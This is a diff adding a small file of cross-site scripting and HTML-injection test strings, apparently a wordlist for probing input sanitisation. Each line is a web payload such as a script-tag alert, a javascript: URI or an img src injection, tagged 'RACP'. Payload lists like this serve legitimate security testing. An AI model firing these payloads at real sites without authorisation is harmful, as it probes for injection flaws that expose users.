@@ -1,0 +1,8 @@
+';alert("RACP");//
+<marquee>RACP</marquee>
+<h1>RACP</h1>
+<script>alert('RACP')</script>
+<script>alert("RACP");</script>
+javascript:alert("RACP")
+<img src="javascript:alert('RACP');">
+<img src=javascript:alert(&quot;RACP&quot;)>
